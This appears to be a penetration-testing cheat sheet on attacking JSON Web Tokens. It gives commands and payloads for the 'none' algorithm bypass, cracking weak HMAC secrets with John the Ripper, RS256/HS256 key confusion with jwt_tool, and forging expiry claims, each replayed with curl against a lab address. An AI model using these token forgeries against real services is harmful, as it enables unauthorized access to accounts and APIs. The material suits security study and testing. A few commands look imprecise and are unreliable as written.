# JWT Attacks

!!! tip "Tip"
    Try `alg: none` first — some libraries still accept unsigned tokens. If RS256 is used, check if the public key is exposed (e.g. `/jwks.json`) and try switching to HS256 signed with the public key as the secret.

!!! warning "Watch out"
    JWT signature validation failures often return a generic 401 — confirm you're actually testing the right field by checking what the app decodes, not just what it rejects.

---

## Identifying JWT Usage

### Using Burp Suite

- Capture requests and inspect the **Authorization** header.
- Look for `Authorization: Bearer <JWT>`.

### Extracting JWT from cURL Responses

```bash
curl -v http://10.10.10.10/api -H "Authorization: Bearer <JWT>"
```

### Decoding a JWT

```bash
echo "<JWT Token>" | jwt_tool -d
```

---

## Common JWT Attacks

### None Algorithm Attack

If the server does not validate the algorithm field properly, change it to `none` and remove the signature.

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Replay the modified token:

```bash
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
```

### Signature Forgery with Weak Secrets

Brute-force a weak secret with John the Ripper:

```bash
echo "<JWT_SECRET>" > jwt_secret.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_secret.txt
```

### Key Confusion Attack

If the server accepts public keys for verification, attempt to sign the JWT with a known key:

```bash
jwt_tool -I -S rsa256 -pk mypublic.pem
```

- `-I` → Interactively modifies the JWT.
- `-S rsa256` → Uses the RSA256 signing algorithm.

### Token Expiry Manipulation

If the server does not properly validate token expiration (`exp` claim), modify and replay it:

```json
{
  "exp": 9999999999
}
```

Replay:

```bash
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
```
